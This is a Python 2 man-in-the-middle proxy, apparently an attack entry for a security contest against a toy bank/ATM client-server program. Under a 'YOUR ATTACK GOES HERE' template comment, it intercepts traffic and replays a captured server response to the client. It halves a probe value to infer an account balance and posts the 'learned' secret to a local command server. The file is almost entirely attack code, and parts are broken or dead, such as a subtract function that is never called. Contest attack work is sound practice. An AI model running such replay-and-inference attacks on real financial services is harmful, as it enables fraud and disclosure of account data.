#!/usr/bin/env python2
from __future__ import print_function
import traceback
import random
import socket
import argparse
import threading
import signal
import json
import requests
import sys
import time
from Queue import Queue
from Queue import LifoQueue
from contextlib import contextmanager

running = True
verbose = True

CLIENT2SERVER = 1
SERVER2CLIENT = 2

good = None
bad = None
good1 = None
ignoring = True
attacking = False
amount = 10
curr = 268435456
#curr = 1024
isFinished = 0

def log( m):
  print( m, file=sys.stderr)

def finish():
  global amount
  amount = amount + 0.00
  log("amount: " + str(amount))
  addr = "http://" + "127.0.0.1" + ":" + "5000"
  # log(addr)
  # notify command server
  r = requests.post(addr, data = {'REQUEST': json.dumps({
    "type": "learned",
    "variable": "amount",
    "secret": amount})})
  r = requests.post( addr, data = {'REQUEST':json.dumps({"type": "done"})})
  # log( r.text)
  # log("really done")

def subtract():
  global curr
  log("in subtract")
  addr = "http://" + "127.0.0.1" + ":" + "5000"
  subReq = {
    "type": "input",
    "input": {
      "input":["-p", "%PORT%", "-i", "%IP%", "-a", "%ACCOUNT%", "-w", "{:0.2f}".format(round(curr, 2))],
      "base64": False
    }
  }
  # log(subReq)
  r = requests.post( addr, data = {'REQUEST':json.dumps(subReq)})
  # log("result from subtracting " + str(curr) + ": " + r.text)


def mitm(buff, direction, shared):
  global good
  global bad
  global attacking
  global amount
  global curr
  global ignoring
  global isFinished
  global good1
  if curr < 0.01:
    finish()
    return buff
  """
  YOUR ATTACK GOES HERE
  """
  hb = "".join("{:02x}".format(ord(c)) for c in buff)
  # hb = buff
  if direction == CLIENT2SERVER:
    return buff 
    # log("!!!!!-> %s ->" % "".join("{:02x}".format(ord(b)) for b in c))
    # log( "-> %s ->" % hb)
    pass
  elif direction == SERVER2CLIENT:
    log("s2c")
    if ignoring:
      log("ignoring...")
      ignoring = False
      return buff
      #attacking = True
    elif attacking:
      log("attacking")
      # log("curr: " + str(curr))
      # log("hb is good? " + ("yes" if hb == good else "no"))
      # log("hb is bad? " + ("yes" if hb == bad else "no"))
      #if len(hb) > 300:
      if hb == good:
        amount += curr
      #if len(hb) < 300 and curr <= 1:
      if hb != good and curr <= 1:
        curr = 0
        isFinished = 1
        return good1
        #finish()
      else:
        #curr = round(curr/2, 2)
        if curr > 1:
         curr = curr/2
        else:
         isFinished = 1
         #finish()
        log("amount: " + str(amount))
        log("new curr: " + str(curr))
        return good1
        #subtract()
    elif good is None:
      log("assigning good")
      good = hb
      good1 = buff
      attacking = True
      return good1
    #elif bad is None:
    #  log("assigning bad")
    #  bad = 300
    #  attacking = True
      #subtract()
    # log( "<- %s <-" % hb)
    #return good
  #return "".join([ i if random.choice([True,False]) == True else '' for i in buff ])
  #return "".join([ chr(ord(i) ^ 0x20) if ord(i) >= 0x41 and ord(i) <= 0x71 else i for i in buff])

@contextmanager
def ignored(*exceptions):
  try:
    yield
  except exceptions:
    pass 

def killp(a, b):
  with ignored(Exception):
    a.shutdown(socket.SHUT_RDWR)
    a.close()
    b.shutdown(socket.SHUT_RDWR)
    b.close()
  return

def worker(client, server, n, shared):
  # log("in worker")
  global isFinished
  while running == True:
    b = ""
    with ignored(Exception):
      b = client.recv(4096)
    if len(b) == 0:
      killp(client,server)
      return
    try:
      b = mitm(b,n, shared)
    except:
      pass
    try:
      server.send(b)
      if isFinished == 1:
       finish()
    except:
      killp(client,server)
      return
  killp(client,server)
  return

def signalhandler(sn, sf):
  global running
  running = False

def doProxyMain(port, remotehost, remoteport):
  # log("in doProxyMain")
  signal.signal(signal.SIGTERM, signalhandler)
  try:
    shared = Queue()
    p = threading.Thread(target=sendInput, args=(args.c, args.d,shared))
    p.start()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    s.listen(1)
    workers = []
    print("started")
    sys.stdout.flush()
    while running == True:
      # log("waiting for connection")
      k,a = s.accept()
      # log("accepted connection")
      v = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      v.connect((remotehost, remoteport))
      t1 = threading.Thread(target=worker, args=(k,v,CLIENT2SERVER, shared))
      t2 = threading.Thread(target=worker, args=(v,k,SERVER2CLIENT, shared))
      t2.start()
      t1.start()
      workers.append((t1,t2,k,v))
  except Exception:
    signalhandler(None, None)
  # log("********exiting1*******")
  for t1,t2,k,v in workers:
    killp(k,v)
    t1.join()
    t2.join()
  # log("********exiting2*******")
  p.join()
  # log("********exiting3*******")
  return

def sendInput( host, port, shared):
  global running
  while running:
    # log("********GETTING******* %s" % str(running))
    try:
      d = shared.get( block=True, timeout = 1)
      time.sleep(1)
      # log("got: %s" % str(d))
      r = requests.post( "http://"+host+":"+str(port), data = {'REQUEST':json.dumps(d)})
      log( r.text)
    except:
      time.sleep(1)
      # log("********next*******")
      pass

if __name__ == '__main__':
  parser = argparse.ArgumentParser(description='Proxy')
  parser.add_argument('-p', type=int, default=4000, help="listen port")
  parser.add_argument('-s', type=str, default="127.0.0.1", help="server ip address")
  parser.add_argument('-q', type=int, default=3000, help="server port")
  parser.add_argument('-c', type=str, default="127.0.0.1", help="command server")
  parser.add_argument('-d', type=int, default=5000, help="command port")
  args = parser.parse_args()
  doProxyMain(args.p, args.s, args.q)

